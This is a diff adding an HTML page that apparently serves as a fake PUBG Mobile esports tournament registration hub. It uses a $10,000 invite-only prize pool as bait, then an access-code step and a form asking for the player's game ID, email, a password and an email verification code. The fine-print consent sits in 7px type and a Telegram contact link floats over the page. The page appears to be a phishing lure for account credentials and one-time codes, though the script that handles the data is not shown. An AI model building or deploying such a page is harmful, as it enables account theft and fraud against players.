@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>ESPORT PUBG MOBILE — Registration Hub (register)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="Early access registration hub for PUBG MOBILE esports projects, slots and partnerships." />
+  <meta name="keywords" content="pubg mobile esports, registration, early access, tournaments" />
+  <link rel="canonical" href="https://esportpubgmobile.com/soon.html" />
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" sizes="32x32" href="/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png" />
+  <link rel="icon" type="image/png" sizes="192x192" href="/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png" />
+  <link rel="apple-touch-icon" href="/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png" />
+  <link rel="shortcut icon" href="/09cce8db33d7aa6c26eb7fc66389b1dd_100x88_fit.png" type="image/png" />
+
+  <link rel="stylesheet" href="/styles.css" />
+</head>
+<body>
+  <div class="page">
+    <!-- HEADER -->
+    <div class="header-wrap">
+      <div class="inner header">
+        <div class="logo">
+          <div class="logo-square"></div>
+          <div class="txt">
+            <div class="top"><span>ESPORT</span><span>PUBG</span><span>MOBILE</span></div>
+            <div class="sub">REGISTRATION HUB</div>
+          </div>
+        </div>
+        <nav class="nav">
+          <a href="/" class="nav-primary">Hub</a>
+          <a href="/#teams">Teams</a>
+          <a href="/#standings">Standings</a>
+          <a href="/#players">Players</a>
+          <a href="/#power-rankings">Power Rank</a>
+          <a href="/#follow">Links</a>
+          <a href="/soon.html" class="nav-soon">Register / Login</a>
+        </nav>
+      </div>
+    </div>
+
+    <!-- MAIN -->
+    <main>
+      <div class="inner">
+        <!-- Hero (можеш змінити картинку) -->
+        <section class="hero" id="open">
+          <div class="hero-wrap">
+            <img class="hero-img" src="/172f6786de4f4d5591f3b061f472e935_fit.webp" alt="PUBG MOBILE OPEN">
+            <div class="hero-overlay">
+              <div class="hero-tag"><span class="dot"></span>OFFICIAL STYLE • CLOSED ACCESS</div>
+              <div class="hero-title">PUBG MOBILE OPEN</div>
+              <div class="hero-sub">INVITE-ONLY QUALIFIER GATEWAY</div>
+            </div>
+          </div>
+        </section>
+
+        <!-- CIS секція (без PNG, з теплим неоном) -->
+        <section class="announce" id="opencis" aria-label="Tournament announcement CIS">
+          <div class="announce-card cis-banner">
+            <h2 class="announce-title">PUBG MOBILE GLOBAL OPEN — <b>CIS</b></h2>
+            <div class="announce-sub">Central registration for CIS region • Closed lobbies • Manual verification</div>
+
+            <!-- 1) Опис -->
+            <div class="cis-desc">
+              Regional tournament for the CIS region with a total <b>prize pool of $10,000</b>.
+              Access is <b>invite-only</b> and limited to <b>approved &amp; registered teams</b>.
+              Separate flow from the global <b>OPEN</b> — this page is dedicated to <b>OPEN — CIS</b>.
+            </div>
+
+            <!-- 2) Призові -->
+            <div class="cis-prize" role="list">
+              <div class="p" role="listitem"><strong>1st place</strong>$5,000</div>
+              <div class="p" role="listitem"><strong>2nd place</strong>$3,000</div>
+              <div class="p" role="listitem"><strong>3rd place</strong>$1,000</div>
+              <div class="p" role="listitem"><strong>4th place</strong>$1,000</div>
+            </div>
+
+            <!-- 3) Про перевірки -->
+            <div class="cis-desc" style="margin-top:0">
+              Closed lobbies, roster checks and <b>manual verification</b> are enforced.
+            </div>
+
+            <!-- 4) Кнопка -->
+            <div style="text-align:center;margin-top:8px">
+              <button id="announce-enter" class="btn">ENTER REGISTRATION CODE</button>
+            </div>
+          </div>
+        </section>
+
+        <!-- STEP 1: код-гейт -->
+        <section class="section" id="code-gate" aria-hidden="true">
+          <div class="title"><span class="bar"></span>Step 1 — Access Code Verification</div>
+          <div class="sub">Enter your invite code. Valid codes unlock the secure registration form.</div>
+          <div class="card">
+            <div class="row">
+              <div class="input-wrap">
+                <div class="label">Access code</div>
+                <input id="access-code" type="text" placeholder="Enter your invite code (e.g. FLOW2025)" />
+              </div>
+              <button id="check-code" class="btn">Verify code</button>
+            </div>
+            <div id="code-status" class="status"></div>
+            <div class="sub" style="margin:6px 0 0">Codes are controlled by admins. Frontend holds a small demo list.</div>
+          </div>
+        </section>
+
+        <!-- STEP 2: форма -->
+        <section class="section" id="registration-section" style="display:none;">
+          <div class="title"><span class="bar"></span>Step 2 — Registration Form</div>
+          <div class="sub">After submission you will be placed into the <b>waiting lobby</b> until manual approval.</div>
+          <form id="reg-form" class="card">
+            <div class="grid-2">
+              <div>
+                <div class="label">Team / Player In-game ID</div>
+                <input type="text" id="ingame-id" required placeholder="PUBG MOBILE numeric ID" />
+              </div>
+              <div>
+                <div class="label">Confirm In-game ID</div>
+                <input type="text" id="ingame-id-confirm" placeholder="Repeat your PUBG MOBILE ID" />
+              </div>
+            </div>
+
+            <div class="grid-2">
+              <div>
+                <div class="label">Email</div>
+                <input type="email" id="email" required placeholder="Your primary contact email" />
+              </div>
+              <div>
+                <div class="label">Password for portal</div>
+                <input type="password" id="password" required placeholder="Create portal password" />
+              </div>
+            </div>
+
+            <div class="grid-2">
+              <div>
+                <div class="label">Repeat password</div>
+                <input type="password" id="password-confirm" required placeholder="Repeat the password" />
+              </div>
+              <div>
+                <div class="label">Email verification code</div>
+                <div class="row" style="margin-bottom:0">
+                  <input type="text" id="email-code" placeholder="Enter code from email (if provided)" />
+                  <button type="button" id="request-email-code" class="btn">Get code</button>
+                </div>
+              </div>
+            </div>
+
+            <div class="row" style="margin-top:6px">
+              <label style="font-size:7px;color:#94a3b8;display:flex;gap:6px;align-items:flex-start;">
+                <input type="checkbox" id="terms" style="width:10px;height:10px;margin-top:2px" required />
+                I confirm that the provided data is accurate and agree to receive notifications about my application status.
+              </label>
+            </div>
+
+            <div id="reg-status" class="status"></div>
+            <div class="submit">
+              <button type="submit" class="submit-btn">Submit application</button>
+            </div>
+          </form>
+        </section>
+
+        <!-- ФІНАЛ -->
+        <section class="section" id="final-message" style="display:none;">
+          <div class="card" id="final-card"></div>
+        </section>
+      </div>
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+      <div class="inner">
+        ESPORTPUBGMOBILE.COM — Closed registration &amp; early access concept hub. Independent project. Not affiliated with Tencent, Krafton or PUBG MOBILE.
+      </div>
+    </footer>
+  </div>
+
+  <!-- TELEGRAM FLOAT -->
+  <a href="https://t.me/v7ck9ll" target="_blank" rel="noopener" class="tg-float" aria-label="Contact @v7ck9ll on Telegram">
+    <svg viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="120" cy="120" r="120" fill="none"/>
+      <path d="M185 66L164 175c-1 5-4 7-8 5l-40-30-19 18c-2 2-4 3-7 3l-3-42 77-69c-3-3-1-4-5-2l-95 60-41-13c-9-3-9-9 2-13l159-61c7-3 14 2 11 13z"/>
+    </svg>
+  </a>
+
+  <script src="/app.js"></script>
+</body>
+</html>
